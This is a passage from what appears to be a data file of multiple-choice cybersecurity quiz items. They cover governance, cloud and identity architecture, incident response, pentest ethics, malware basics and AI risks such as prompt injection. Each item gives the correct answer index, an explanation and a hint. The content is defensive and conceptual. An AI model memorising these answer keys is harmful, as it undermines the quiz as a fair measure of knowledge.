    q: "What is the concern behind a 'harvest now, decrypt later' threat?",
    options: ["Attackers delete encrypted data today so that it cannot be recovered later","Quantum computers automatically bypass every password and authentication check","Attackers collect encrypted data now so they can decrypt it once quantum computers can","All current encryption has already been broken by attackers"],
    correct: 2, why: "Long-lived sensitive data may be collected today and targeted for decryption in the future, motivating migration planning.",
    hint: "Consider data that must remain confidential for many years."
  },
  {
    id: 67, rank: 3, topic: "Identity Architecture", difficulty: "EXPERT",
    q: "Why prefer workload identities over long-lived embedded cloud credentials?",
    options: ["They reduce static-secret exposure and allow short-lived access","They remove all authentication requirements from cloud services","They require administrator access for every task","They prevent the need for audit logs"],
    correct: 0, why: "Workload identity can avoid distributing long-lived secrets and make permissions easier to scope and review.",
    hint: "Reduce static credentials and narrow permissions."
  },
  {
    id: 68, rank: 3, topic: "Microservices", difficulty: "EXPERT",
    q: "In a microservices architecture, what is a sound approach to service-to-service access?",
    options: ["Trust every request that comes from the internal network","Authenticate services and authorise each action","Share one unrestricted token among all of the services","Disable TLS between internal services by default to save overhead"],
    correct: 1, why: "Internal services can be compromised too; authenticate and authorise service calls and protect communications.",
    hint: "Internal does not mean automatically trusted."
  },
  {
    id: 69, rank: 3, topic: "Secure by Design", difficulty: "EXPERT",
    q: "What does secure-by-design mean in practice?",
    options: ["Add security controls only after the product has launched","Depend on end users to avoid every risk","Build security requirements and safe defaults into design","Treat compliance certification as proof of security"],
    correct: 2, why: "Security is considered throughout the lifecycle, with safer defaults and mitigations built into the product.",
    hint: "Security should shape the design from the beginning."
  },
  {
    id: 70, rank: 3, topic: "Supply Chain Security", difficulty: "EXPERT",
    q: "What is the value of a software bill of materials (SBOM)?",
    options: ["It lists software components to support vulnerability response","It guarantees that every listed component is safe to use","It replaces code signing and the need for build controls","It proves that a vendor has no vulnerabilities in its products"],
    correct: 0, why: "An SBOM improves visibility into components so organisations can assess exposure when new issues emerge.",
    hint: "Know what components are inside the software."
  },
  {
    id: 71, rank: 3, topic: "Build Security", difficulty: "EXPERT",
    q: "Why isolate and protect CI/CD runners and build credentials?",
    options: ["Build systems have no way to affect production environments","A compromised build system can inject malicious code","It improves user interface design only, not the security of releases","It removes the need for code review of changes to the product"],
    correct: 1, why: "Build pipelines are high-value targets because they can influence software delivered to many users.",
    hint: "A compromised build can compromise the product."
  },
  {
    id: 72, rank: 3, topic: "Cloud Account Isolation", difficulty: "EXPERT",
    q: "How should a cloud architecture limit the blast radius of a compromised development account?",
    options: ["Run every workload in a single shared account for simplicity","Give developers production administrator rights so they can respond quickly","Use one shared credential across all environments to ease access","Separate accounts per environment, with guardrails and limited trust"],
    correct: 3, why: "Account-level separation with guardrails stops a compromise in development from automatically reaching production resources.",
    hint: "Think about boundaries between environments."
  },
  {
    id: 73, rank: 3, topic: "Session Token Security", difficulty: "EXPERT",
    q: "An attacker steals a valid session token after a user has passed MFA. Which design control best limits its reuse?",
    options: ["Short-lived tokens, device binding and continuous risk evaluation of sessions","Longer session lifetimes so that users are prompted for MFA less often","Requiring the same password at every sign-in","Disabling MFA so that fewer tokens are issued"],
    correct: 0, why: "MFA protects the sign-in, not the session that follows, so tokens should be short-lived, bound to the device and re-evaluated as risk changes.",
    hint: "MFA does not help once a valid session already exists."
  },
  {
    id: 74, rank: 3, topic: "Logging Architecture", difficulty: "EXPERT",
    q: "What should a security logging architecture balance?",
    options: ["Maximum data collection regardless of privacy, cost or legal limits","No central collection, with each system keeping its own logs","Detection value, integrity, retention, privacy and cost","Unlimited retention of all secrets found in the log data"],
    correct: 2, why: "Effective logging supports detection and investigation while managing sensitive data, integrity and retention requirements.",
    hint: "Logs must be useful, protected and proportionate."
  },
  {
    id: 75, rank: 3, topic: "Network Architecture", difficulty: "EXPERT",
    q: "What is a benefit of egress filtering?",
    options: ["It blocks every inbound attack before it ever reaches the network perimeter","It replaces endpoint monitoring","It makes DNS unnecessary","It can restrict unauthorised outbound connections and some exfiltration"],
    correct: 3, why: "Egress controls can constrain outbound traffic to approved destinations and protocols, supporting detection and containment.",
    hint: "Consider what compromised hosts can contact externally."
  },
  {
    id: 76, rank: 3, topic: "API Architecture", difficulty: "EXPERT",
    q: "How should API authorisation be designed for multi-tenant systems?",
    options: ["Trust a tenant ID supplied by the client without validation","Enforce tenant context and object permissions server-side","Hide tenant IDs in the user interface and rely on obscurity","Use TLS as the sole access control between tenants and users"],
    correct: 1, why: "Server-side authorisation must verify the caller's access to each tenant and object; client-supplied identifiers are not proof.",
    hint: "Do not trust client-controlled tenant identifiers."
  },
  {
    id: 77, rank: 3, topic: "Incident Readiness", difficulty: "EXPERT",
    q: "Why should incident-response playbooks be exercised?",
    options: ["Exercises guarantee that real incidents will not occur in future","They replace backups","They reveal gaps in roles and procedures before a real incident occurs","They remove the need for monitoring"],
    correct: 2, why: "Tabletop and technical exercises help validate readiness and improve plans under realistic constraints.",
    hint: "Test the plan, not just the document."
  },
  {
    id: 78, rank: 3, topic: "Security Metrics", difficulty: "EXPERT",
    q: "Which metric is generally more actionable than simply counting vulnerabilities?",
    options: ["Total number of alerts raised each month without any context","Number of pages in the organisation's information security policy documents","Number of tools purchased","Time to remediate exposed critical vulnerabilities by asset risk"],
    correct: 3, why: "Risk-contextual metrics connect security work to exposure and remediation outcomes.",
    hint: "Measure meaningful risk and response, not activity alone."
  },
  {
    id: 79, rank: 3, topic: "AI Security", difficulty: "EXPERT",
    q: "An AI agent can read email and execute payments. What is the most important architectural safeguard?",
    options: ["Constrain tools and permissions, and require approval for risky actions","Give it broad standing permissions to reduce friction for users","Trust all instructions found in email","Allow the agent to approve its own requests for additional privileges"],
    correct: 0, why: "Agents can be manipulated by untrusted content, so permissions, action boundaries and oversight must be designed explicitly.",
    hint: "Treat the agent as a privileged identity with tools."
  },
  {
    id: 80, rank: 3, topic: "Privacy Engineering", difficulty: "EXPERT",
    q: "What is the purpose of privacy threat modelling?",
    options: ["To guarantee compliance with privacy law by itself","To identify how personal data could be misused and plan mitigations","To eliminate all processing of personal data across the entire organisation","To replace legal review and governance oversight completely"],
    correct: 1, why: "Privacy threat modelling examines data flows, misuse cases and controls to reduce privacy risks.",
    hint: "Model misuse and exposure of personal data."
  },
  {
    id: 81, rank: 4, topic: "Incident Leadership", difficulty: "EXPERT",
    q: "During a major incident, executives ask for a definitive attribution before evidence is sufficient. What should the incident lead do?",
    options: ["Name the most likely attacker as fact to reassure leaders","Share verified facts, confidence levels and unknowns","Stop communicating until attribution is certain","Publish raw logs publicly"],
    correct: 1, why: "Clear incident communication separates confirmed evidence from hypotheses and states what is still being investigated.",
    hint: "Be transparent about uncertainty."
  },
  {
    id: 82, rank: 4, topic: "Risk Governance", difficulty: "EXPERT",
    q: "A business owner accepts a high residual cyber risk. What should good governance require?",
    options: ["An undocumented verbal agreement between the owner and the analyst","Automatic permanent acceptance with no review date at all","Transfer the decision to the security analyst alone to decide","Documented ownership, rationale, duration and approval"],
    correct: 3, why: "Risk acceptance should be explicit, accountable, time-bounded where appropriate and revisited as conditions change.",
    hint: "Acceptance needs an owner and an auditable rationale."
  },
  {
    id: 83, rank: 4, topic: "Threat Intelligence", difficulty: "EXPERT",
    q: "How should threat intelligence influence defensive priorities?",
    options: ["Assess credibility and relevance to the organisation's exposure","Treat every report as equally relevant to the organisation","Deploy every received indicator immediately, without validating it first","Use intelligence only after an incident has been confirmed"],
    correct: 0, why: "Intelligence is most useful when contextualised to the organisation and converted into proportionate action.",
    hint: "Relevance matters more than volume."
  },
  {
    id: 84, rank: 4, topic: "Detection Engineering", difficulty: "EXPERT",
    q: "A detection rule catches true attacks but generates many false positives. What is the best next step?",
    options: ["Disable the rule permanently without any further review","Suppress every alert that comes from the same source","Analyse alert data, refine the logic and thresholds, and retest","Assume that analysts should simply absorb unlimited noise as part of the job"],
    correct: 2, why: "Detection engineering balances precision and coverage through testing, tuning and ongoing measurement.",
    hint: "Use evidence to tune, not guess."
  },
  {
    id: 85, rank: 4, topic: "Purple Teaming", difficulty: "EXPERT",
    q: "What is the primary value of purple teaming?",
    options: ["Keeping the red and blue teams apart so that results stay independent","Replacing all production monitoring","Proving to the board that the organisation is fully secure","Combining attack simulation and defender feedback to improve detection"],
    correct: 3, why: "Purple teaming connects attack techniques to defensive telemetry and improvements in controls and detections.",
    hint: "Turn simulated attacks into measurable defensive improvements."
  },
  {
    id: 86, rank: 4, topic: "Security Programme", difficulty: "EXPERT",
    q: "How should a security leader decide between several competing control investments?",
    options: ["Choose the tool with the most features and best reviews","Compare expected risk reduction, impact, effort and residual risk","Prioritise the newest technology","Divide the funding equally between options regardless of exposure"],
    correct: 1, why: "Investment decisions should be risk-informed and consider effectiveness, cost, operational fit and business priorities.",
    hint: "Compare outcomes, not marketing claims."
  },
  {
    id: 87, rank: 4, topic: "Cloud Incident Response", difficulty: "EXPERT",
    q: "A compromised cloud workload is about to be terminated by auto-scaling. What should responders do first to support the investigation?",
    options: ["Let it terminate so that the threat disappears automatically","Reboot it to clear any malicious processes before analysis","Isolate it and preserve snapshots and control-plane audit logs","Delete the affected account's audit trail to reduce noise during analysis"],
    correct: 2, why: "Cloud resources are ephemeral, so evidence such as snapshots and control-plane logs must be preserved before the workload disappears.",
    hint: "Evidence in the cloud can vanish quickly."
  },
  {
    id: 88, rank: 4, topic: "Regulatory Response", difficulty: "EXPERT",
    q: "A suspected breach may involve regulated personal data. What should the organisation do first?",
    options: ["Start incident and privacy/legal processes to assess scope, evidence and duties","Make a public statement straight away, before any facts have been assessed","Delete the affected records immediately to limit further exposure","Assume notification is never required"],
    correct: 0, why: "Promptly assess the facts with relevant response, privacy and legal specialists so obligations and deadlines can be determined.",
    hint: "Escalate through the established incident and privacy process."
  },
  {
    id: 89, rank: 4, topic: "AI Governance", difficulty: "EXPERT",
    q: "An AI agent is approved for a low-risk pilot but later gains access to production customer records. What should happen?",
    options: ["Continue because the agent was already approved once for the pilot","Reassess the changed use case, permissions and data risks","Rely on the original pilot evaluation indefinitely, as nothing has changed","Let the agent decide for itself whether it needs any human oversight"],
    correct: 1, why: "Material changes to capability, data access or impact can change risk and should trigger reassessment and approval.",
    hint: "Approval is tied to scope and assumptions."
  },
  {
    id: 90, rank: 4, topic: "AI Prompt Injection", difficulty: "EXPERT",
    q: "An agent retrieves a webpage containing instructions to reveal internal data. What is the safest design principle?",
    options: ["Treat retrieved text as trusted system instructions so the agent can follow it","Allow the page to change the agent's system prompt","Give the agent unrestricted access so that it can decide safely for itself","Treat external content as untrusted and enforce policy outside the model"],
    correct: 3, why: "Prompt injection exploits confusion between data and instructions; robust controls must constrain what tools and data the agent can access.",
    hint: "Untrusted content must not override policy."
  },
  {
    id: 91, rank: 4, topic: "AI Evaluation", difficulty: "EXPERT",
    q: "Why evaluate an AI security control against adaptive, multi-turn attacks rather than only static prompts?",
    options: ["Attackers adapt across turns, so single-turn tests can miss failures","Static prompts are always harder for models to defend against","Multi-turn testing guarantees complete security against all attackers","It removes the need for human review"],
    correct: 0, why: "Multi-turn evaluations test whether protections persist as context and attacker strategies evolve.",
    hint: "Security behaviour can change over a conversation."
  },
  {
    id: 92, rank: 4, topic: "Cryptographic Migration", difficulty: "EXPERT",
    q: "What is a sensible first step in planning a post-quantum cryptography migration?",
    options: ["Replace every algorithm immediately, without first carrying out an inventory","Wait until every legacy system fails","Inventory cryptographic assets and prioritise long-lived sensitive data first","Assume that a vendor update will cover every dependency automatically"],
    correct: 2, why: "An inventory reveals where cryptography is used and supports risk-based migration planning across systems and suppliers.",
    hint: "You cannot migrate what you have not identified."
  },
  {
    id: 93, rank: 4, topic: "Cyber Crisis Communications", difficulty: "EXPERT",
    q: "What should public incident communications avoid?",
    options: ["Clear updates based on verified facts","Explaining protective steps to the users who are affected by the incident","Coordinated messages that have been reviewed by the response team","Speculation presented as fact and promises that cannot be kept"],
    correct: 3, why: "Unsupported attribution or assurances can mislead stakeholders and undermine trust. Communicate known facts and uncertainties.",
    hint: "Distinguish evidence from speculation."
  },
  {
    id: 94, rank: 4, topic: "Shared Responsibility", difficulty: "EXPERT",
    q: "A board asks who is responsible for securing data held in a SaaS application. What is the best answer?",
    options: ["The provider secures the platform; the customer secures data and access","The provider is fully responsible for everything stored in the service, including customer data","Responsibility passes to the regulator once a contract is signed","The customer is responsible only for the provider's physical datacentres and staff"],
    correct: 0, why: "Cloud providers secure the underlying platform, but customers remain accountable for their data, identities, configuration and access.",
    hint: "Responsibility is divided, not transferred."
  },
  {
    id: 95, rank: 4, topic: "Identity Compromise Recovery", difficulty: "EXPERT",
    q: "A directory administrator account is believed to be compromised across the domain. What is the soundest recovery principle?",
    options: ["Reset only the passwords of users who reported problems","Restore the directory from last night's backup and resume normal operations","Assume the identity system is untrusted and rebuild trust in a planned order","Disable all monitoring so the attacker is not alerted to the response"],
    correct: 2, why: "When directory administration is compromised, every credential and trust relationship derived from it may be tainted, so trust must be re-established deliberately.",
    hint: "Anything the attacker could reach may no longer be trustworthy."
  },
  {
    id: 96, rank: 4, topic: "Cyber Risk Quantification", difficulty: "EXPERT",
    q: "What is a key limitation of presenting a cyber-risk estimate as a single precise number?",
    options: ["Numbers can never support good decision-making in security","The estimate can hide uncertainty and assumptions","Risk cannot be discussed meaningfully with business leaders","All models are equally reliable"],
    correct: 1, why: "Quantification should communicate assumptions, uncertainty and ranges where appropriate rather than implying false precision.",
    hint: "Explain the uncertainty behind the estimate."
  },
  {
    id: 97, rank: 4, topic: "Secure Architecture Review", difficulty: "EXPERT",
    q: "A design review finds a single identity provider whose compromise could affect every critical service. What should the review focus on?",
    options: ["Ignore it because centralised identity is convenient for administrators","Remove all authentication","Add more services to the same trust boundary to simplify access","Assess blast radius and resilience, then add layered protections"],
    correct: 3, why: "Central identity is a critical dependency; resilience and layered controls should address compromise and outage scenarios.",
    hint: "Consider what happens if the shared dependency fails."
  },
  {
    id: 98, rank: 4, topic: "Adversary Simulation", difficulty: "EXPERT",
    q: "What makes an adversary simulation useful to senior leadership?",
    options: ["A dramatic demonstration of attacker skill without agreed objectives","Clear objectives, safe scope and evidence tied to business outcomes","A guarantee that no other attack will ever succeed against the company","Keeping all findings from control owners"],
    correct: 1, why: "A well-governed exercise tests assumptions and produces actionable improvements tied to defined objectives.",
    hint: "Define what the exercise is meant to prove."
  },
  {
    id: 99, rank: 4, topic: "DDoS Resilience", difficulty: "EXPERT",
    q: "A critical public service must withstand large volumetric DDoS attacks. Which strategy is most appropriate?",
    options: ["Layered defences: upstream scrubbing, redundancy and a rehearsed plan","Rely on a single on-premises firewall that is sized for average daily traffic levels","Block all traffic from outside the home country at all times, permanently","Ask users to retry later and hope the attack stops by itself"],
    correct: 0, why: "Volumetric attacks exceed local capacity, so resilience relies on upstream capacity, redundancy and practised response.",
    hint: "One local device cannot absorb an attack larger than its bandwidth."
  },
  {
    id: 100, rank: 4, topic: "Cyber Strategy", difficulty: "EXPERT",
    q: "How should a mature cyber strategy align with business objectives?",
    options: ["Maximise the number of tools deployed regardless of actual need","Treat regulatory compliance as the only objective of the whole strategy","Protect critical services, define risk appetite and measure outcomes","Separate security decisions from the business owners of the risk"],
    correct: 2, why: "Cyber strategy should protect business-critical outcomes and provide accountable, measurable risk reduction.",
    hint: "Start from business impact and critical services."
  },
  {
    id: 101, rank: 0, topic: "GRC Fundamentals", difficulty: "BEGINNER",
    q: "What is the main purpose of an information security policy?",
    options: ["To list every employee's password so that managers can access accounts","To replace the need for technical controls, audits and monitoring","To set out management's expectations for protecting information","To guarantee that the organisation will never be breached by any attacker"],
    correct: 2, why: "A security policy communicates management's intent and the rules people are expected to follow when handling information and systems.",
    hint: "Think about who sets direction for how information is protected."
  },
  {
    id: 102, rank: 0, topic: "Risk Concepts", difficulty: "BEGINNER",
    q: "In cyber security, what does 'risk' describe?",
    options: ["The chance of harm if a threat exploits a weakness in an asset","Any software on the network that is out of date or no longer supported","A password that has expired and must be changed by the user","A guaranteed attack on a system that has not been patched"],
    correct: 0, why: "Risk combines the likelihood of a threat exploiting a weakness with the impact if it happens.",
    hint: "Risk is about possibility and consequence, not certainty."
  },
  {
    id: 103, rank: 0, topic: "Compliance", difficulty: "BEGINNER",
    q: "Why do organisations adopt standards such as ISO/IEC 27001?",
    options: ["To avoid ever being audited by customers or regulators","To remove all legal obligations that relate to security","To make every system impossible to attack","To apply a recognised security management framework"],
    correct: 3, why: "Standards give organisations a structured, recognised approach to managing security and demonstrating good practice.",
    hint: "Standards provide structure, not guarantees."
  },
  {
    id: 104, rank: 0, topic: "AI Data Handling", difficulty: "BEGINNER",
    q: "Why should you avoid pasting confidential company data into a public AI chatbot?",
    options: ["Chatbots are unable to process text that contains confidential information at all","The data may be stored or reused in ways the organisation has not approved","It makes the chatbot respond more slowly for other users","It permanently disables your account after one submission"],
    correct: 1, why: "Public AI services may retain or process submitted data under terms the organisation has not assessed or approved.",
    hint: "Consider where your input goes after you press send."
  },
  {
    id: 105, rank: 0, topic: "AI Reliability", difficulty: "BEGINNER",
    q: "What is an AI 'hallucination'?",
    options: ["Output that sounds confident but is false or unsupported","A chatbot refusing to answer a question it considers risky","An AI system shutting itself down after repeated errors","An AI model encrypting its own responses before sending them"],
    correct: 0, why: "Language models can generate plausible-sounding content that is inaccurate, so important outputs need verification.",
    hint: "Fluent does not always mean factual."
  },
  {
    id: 106, rank: 0, topic: "AI-Enabled Phishing", difficulty: "BEGINNER",
    q: "How has generative AI affected the quality of phishing emails?",
    options: ["Phishing emails have become much easier for staff to spot","AI cannot be used to write emails that look professional","They can be more convincing, so verifying requests independently matters even more","AI tools now automatically block all phishing messages before delivery to staff"],
    correct: 2, why: "Generative AI can help attackers produce polished, personalised messages, so poor spelling is no longer a reliable warning sign.",
    hint: "Do not rely on bad grammar to spot a scam."
  },
  {
    id: 107, rank: 0, topic: "Malware Basics", difficulty: "BEGINNER",
    q: "Which of the following is an example of malware?",
    options: ["A firewall that filters unwanted network traffic","A password manager that stores unique passwords","An update from an official vendor's website","A trojan disguised as a legitimate program"],
    correct: 3, why: "A trojan appears to be useful or harmless software while performing malicious actions in the background.",
    hint: "Look for software that pretends to be something it is not."
  },
  {
    id: 108, rank: 0, topic: "Malware Types", difficulty: "BEGINNER",
    q: "What is a key characteristic of a computer worm?",
    options: ["It needs a user to open it manually each time it spreads further","It can spread itself across networks without a host file","It only affects printers and other network devices such as scanners","It is always harmless to the systems that it eventually reaches"],
    correct: 1, why: "Worms are self-replicating and can spread between systems on their own, often by exploiting vulnerabilities or weak credentials.",
    hint: "Think about malware that spreads without user action."
  },
  {
    id: 109, rank: 0, topic: "Pentesting Basics", difficulty: "BEGINNER",
    q: "What is penetration testing?",
    options: ["Illegally accessing systems in order to find valuable data to sell","Installing antivirus on all devices","An authorised, simulated attack used to find security weaknesses","Deleting unused accounts to reduce the attack surface"],
    correct: 2, why: "A penetration test is a controlled, authorised assessment that attempts to find and validate weaknesses before real attackers do.",
    hint: "The key word is 'authorised'."
  },
  {
    id: 110, rank: 0, topic: "Pentesting Ethics", difficulty: "BEGINNER",
    q: "What must a penetration tester have before starting a test?",
    options: ["Written authorisation from the owner that defines the scope","Verbal approval from any employee who works at the target","A copy of the target's administrator passwords","Nothing, as long as the aim is to help the organisation"],
    correct: 0, why: "Testing without clear written permission and scope can be illegal and may cause harm to systems that were never meant to be tested.",
    hint: "Good intentions do not replace permission."
  },
  {
    id: 111, rank: 1, topic: "Risk Registers", difficulty: "INTERMEDIATE",
    q: "What is the main purpose of a risk register?",
    options: ["To store the user passwords used across the organisation","To record risks with their owners, ratings and treatments","To list only the technical vulnerabilities found in scans and tests","To replace the incident response plan"],
    correct: 1, why: "A risk register provides a single, maintained record of risks and who is accountable for managing them.",
    hint: "It tracks ownership and decisions, not just findings."
  },
  {
    id: 112, rank: 1, topic: "Risk Treatment", difficulty: "INTERMEDIATE",
    q: "Which set lists the recognised ways to treat a risk?",
    options: ["Hide it, delay it, delete it or ignore it","Document it only after an incident has taken place","Wait until it becomes an incident, then decide","Mitigate, transfer, avoid or accept it"],
    correct: 3, why: "Common risk treatment options are reducing the risk, transferring it (for example by insurance or contract), avoiding the activity, or formally accepting it.",
    hint: "Each option is a deliberate, documented decision."
  },
  {
    id: 113, rank: 1, topic: "Policy Governance", difficulty: "INTERMEDIATE",
    q: "What is the difference between a policy and a procedure?",
    options: ["A policy sets intent and rules; a procedure describes the steps","A policy is always technical, while a procedure is always legal in nature","They are identical documents","A procedure is mandatory for staff, while a policy is entirely optional"],
    correct: 0, why: "Policies set direction and requirements, while procedures explain how to carry them out in practice.",
    hint: "One says what and why; the other says how."
  },
  {
    id: 114, rank: 1, topic: "Prompt Injection", difficulty: "INTERMEDIATE",
    q: "What is prompt injection in an LLM-based application?",
    options: ["Adding more GPU memory to the server that hosts the model","Fine-tuning a model on public data to improve its accuracy on new tasks","Crafting input that makes the model follow attacker instructions","Compressing prompts to save tokens and reduce cost"],
    correct: 2, why: "Prompt injection exploits the model's difficulty in separating trusted instructions from untrusted input.",
    hint: "The attacker's text is treated as instructions."
  },
  {
    id: 115, rank: 1, topic: "AI Data Poisoning", difficulty: "INTERMEDIATE",
    q: "What is 'data poisoning' in machine learning security?",
    options: ["Deleting a model from storage once training has finished","Manipulating training data to corrupt or bias model behaviour","Encrypting model weights so that they cannot be copied or stolen","Reducing the size of a dataset to speed up training runs"],
    correct: 1, why: "Poisoned data can cause a model to learn incorrect patterns or hidden behaviours, so data provenance and integrity matter.",
    hint: "Think about what happens if the training data cannot be trusted."
  },
  {
    id: 116, rank: 1, topic: "Static Analysis", difficulty: "INTERMEDIATE",
    q: "What is static analysis of malware?",
    options: ["Running the sample on a production server to observe what it does","Watching its network traffic live","Restoring files after infection","Examining a sample's code and properties without executing it"],
    correct: 3, why: "Static analysis inspects strings, headers, imports and code without running the sample, which reduces execution risk.",
    hint: "The sample is examined but never run."
  },
  {
    id: 117, rank: 1, topic: "Dynamic Analysis", difficulty: "INTERMEDIATE",
    q: "Why is dynamic malware analysis performed in an isolated sandbox or virtual machine?",
    options: ["To observe behaviour while containing the risk of spread","To make the malware run faster and more reliably on the test system","To avoid recording its actions while the sample is running","To let the sample reach the corporate network safely for testing"],
    correct: 0, why: "Isolation lets analysts watch file, registry, process and network activity without endangering real systems.",
    hint: "Containment comes before observation."
  },
  {
    id: 118, rank: 1, topic: "Malicious Documents", difficulty: "INTERMEDIATE",
    exhibit: "FROM: Accounts <invoices@supplier-billing.example>\nSUBJECT: Overdue invoice\n\nPlease see the attached invoice. If the document appears blank, click 'Enable Content' to view it.",
    q: "Why is the instruction to 'Enable Content' a warning sign?",
    options: ["It is always required before any document can be read safely","It only changes how the document looks on screen","Enabling content can let embedded macros run and fetch more malware","It automatically scans the file for known threats first"],
    correct: 2, why: "Malicious documents often rely on macros or active content to execute code once the user enables it.",
    hint: "Think about what active content in a document can do."
  },
  {
    id: 119, rank: 1, topic: "Pentest Methodology", difficulty: "INTERMEDIATE",
    q: "Which phase of a penetration test involves gathering information about the target?",
    options: ["Reporting the findings to the client","Exploitation of discovered weaknesses","Retesting after fixes have been applied","Reconnaissance of the target"],
    correct: 3, why: "Reconnaissance collects information about systems, people and services to understand the attack surface.",
    hint: "It happens before any weakness is tested."
  },
  {
    id: 120, rank: 1, topic: "Vulnerability Scanning", difficulty: "INTERMEDIATE",
    q: "What is a key difference between a vulnerability scan and a penetration test?",
    options: ["A scan exploits systems manually, while a pentest only lists the software versions in use","A scan finds potential weaknesses automatically; a pentest validates and chains them","They always produce identical results, so organisations only ever need to use one of the two","A pentest never requires any form of authorisation from the owner"],
    correct: 1, why: "Scans find potential issues at scale; penetration tests add human judgement to validate impact and combine weaknesses.",
    hint: "One is mostly automated discovery, the other is human-led validation."
  },
  {
    id: 121, rank: 2, topic: "ISO 27001", difficulty: "ADVANCED",
    q: "What does the Statement of Applicability in ISO/IEC 27001 document?",
    options: ["Employee salary bands and the bonus structure for the security team","Penetration test results and remediation deadlines","The incident log for the previous financial year","Which controls apply, their status and the reasons for any exclusions"],
    correct: 3, why: "The Statement of Applicability links the risk assessment to the selected controls and explains inclusions and exclusions.",
    hint: "It connects risk decisions to controls."
  },
  {
    id: 122, rank: 2, topic: "Segregation of Duties", difficulty: "ADVANCED",
    q: "What does segregation of duties aim to achieve as a governance control?",
    options: ["Splitting critical tasks between people so no one can act unchecked","Giving one trusted administrator all rights to keep operations simple","Placing servers in separate rooms to reduce the risk of fire or flooding","Rotating every password each month so that no user can ever reuse an old one"],
    correct: 0, why: "Splitting responsibilities, such as requesting and approving a change, reduces the risk of error and abuse by a single individual.",
    hint: "Think about requiring more than one person for sensitive actions."
  },
  {
    id: 123, rank: 2, topic: "RAG Security", difficulty: "ADVANCED",
    q: "An LLM chatbot retrieves documents from a knowledge base and sometimes returns content the user should not see. What is the most likely cause?",
    options: ["The model has too many parameters for the retrieval index","The temperature setting is too low for the user's queries","Access controls are not enforced on the retrieval layer","The tokenizer is out of date with the latest model version"],
    correct: 2, why: "In retrieval-augmented generation, permissions must be enforced when documents are retrieved, since the model cannot be relied on to withhold data.",
    hint: "Check who is allowed to retrieve what before the model sees it."
  },
  {
    id: 124, rank: 2, topic: "Model Extraction", difficulty: "ADVANCED",
    q: "What is a model extraction attack?",
    options: ["Repeatedly querying a model to approximate or copy its behaviour closely","Deleting a model from a shared code repository","Compressing a model to reduce its size and hosting costs","Encrypting a model's weights before it is deployed to production"],
    correct: 0, why: "Attackers can use many crafted queries and responses to approximate a proprietary model, so access controls, rate limits and monitoring help protect it.",
    hint: "Consider what an attacker can learn from many API responses."
  },
  {
    id: 125, rank: 2, topic: "Insecure Output Handling", difficulty: "ADVANCED",
    q: "An application passes LLM output directly to a database query or shell command. What is the best mitigation?",
    options: ["Trust the output because the model has been well trained and tested","Treat the output as untrusted and validate it before use","Increase the maximum token limit for each response from the model","Hide the system prompt from users so that attackers cannot read it"],
    correct: 1, why: "Model output can be influenced by attackers, so it needs the same validation and safe handling as any untrusted input.",
    hint: "Output from a model is not automatically safe."
  },
  {
    id: 126, rank: 2, topic: "Malware Obfuscation", difficulty: "ADVANCED",
    q: "Why do malware authors commonly pack or obfuscate their code?",
    options: ["To make files smaller so they download faster for legitimate users","To guarantee the code is digitally signed","To hinder static analysis and signature-based detection","To make execution faster on every system"],
    correct: 2, why: "Packing and obfuscation conceal code and strings, making analysis and signature matching harder.",
    hint: "The goal is to hide what the code really does."
  },
  {
    id: 127, rank: 2, topic: "Indicators of Compromise", difficulty: "ADVANCED",
    q: "What is an indicator of compromise (IOC)?",
    options: ["A vendor's marketing claim about detection rates, features and coverage levels","A user's performance metric used in annual staff reviews","A password policy setting that sets the minimum length","An observable artefact, such as a file hash or domain, linked to an attack"],
    correct: 3, why: "IOCs help defenders detect, hunt for and scope compromise, though they can change quickly and need context.",
    hint: "It is evidence left behind by an attacker or malware."
  },
  {
    id: 128, rank: 2, topic: "Misconfiguration Testing", difficulty: "ADVANCED",
    q: "During an external test, a tester finds an administrative interface exposed to the internet that accepts default credentials. How should this finding be treated?",
    options: ["Informational only, because a login is still required to access it","High or critical, because it can give attackers control","Low risk, because the interface is rarely used by staff","Not reportable at all if no data was viewed during testing"],
    correct: 1, why: "Default credentials on an exposed administrative interface are easily abused and can lead to full compromise, so they are usually rated severe.",
    hint: "Consider how easy the weakness is to find and what access it gives."
  },
  {
    id: 129, rank: 2, topic: "Rules of Engagement", difficulty: "ADVANCED",
    q: "What is the purpose of a rules-of-engagement document in a penetration test?",
    options: ["To list the vulnerabilities found during the test","To describe the client's marketing plans and sales targets for the year","To define permitted targets, techniques, timing and contacts","To replace the legal contract between the two parties"],
    correct: 2, why: "Rules of engagement set safe, agreed boundaries and escalation routes so testing is controlled and accountable.",
    hint: "It sets the boundaries before testing starts."
  },
  {
    id: 130, rank: 2, topic: "Pentest Reporting", difficulty: "ADVANCED",
    q: "Why should a penetration test report include risk ratings and remediation advice?",
    options: ["So the client can prioritise and fix issues effectively","To make the report longer and look more impressive","To prove how clever the tester was to the client","To avoid the need for any retesting after fixes are made"],
    correct: 0, why: "Findings are only useful if the client understands their impact and knows what to do about them.",
    hint: "A report should drive action."
  },
  {
    id: 131, rank: 3, topic: "Regulatory Mapping", difficulty: "EXPERT",
    q: "An organisation operates in several jurisdictions with overlapping regulations. What is the most effective compliance approach?",
    options: ["Comply only with the rules of the home country's main regulator","Build entirely separate control sets for every regulation that applies","Wait for regulators to ask for evidence before changing anything at all","Map requirements to one control framework and find the gaps"],
    correct: 3, why: "A common control set mapped to each requirement reduces duplication while ensuring the strictest applicable obligations are met.",
    hint: "Consolidate controls, then map each regulation to them."
  },
  {
    id: 132, rank: 3, topic: "Governance Models", difficulty: "EXPERT",
    q: "What is the main purpose of the 'three lines' governance model?",
    options: ["To define three tiers of network firewalls and gateways","To separate risk ownership, oversight and assurance","To require independent audits at least three times a year","To require three approvers for every change"],
    correct: 1, why: "The model clarifies that management owns risk, oversight functions support and challenge it, and internal audit provides independent assurance.",
    hint: "Think about who owns, who oversees and who independently checks."
  },
  {
    id: 133, rank: 3, topic: "Risk Metrics", difficulty: "EXPERT",
    q: "How does a key risk indicator (KRI) differ from a key performance indicator (KPI)?",
    options: ["KRIs measure how fast a team works, while KPIs measure danger","They are identical measures under two different names","KRIs signal rising exposure, while KPIs measure performance","KRIs apply only to financial systems and not to security programmes"],
    correct: 2, why: "KRIs act as early warnings of rising risk, whereas KPIs track performance against goals.",
    hint: "One looks forward at exposure; the other tracks performance."
  },
  {
    id: 134, rank: 3, topic: "AI Supply Chain", difficulty: "EXPERT",
    q: "Why should models downloaded from public hubs be treated as part of the software supply chain?",
    options: ["They can contain backdoors or malicious code, so provenance matters","Models are always stored as plain text files and can never execute code","Public hubs verify every upload before it is published","Models are immune to tampering once published"],
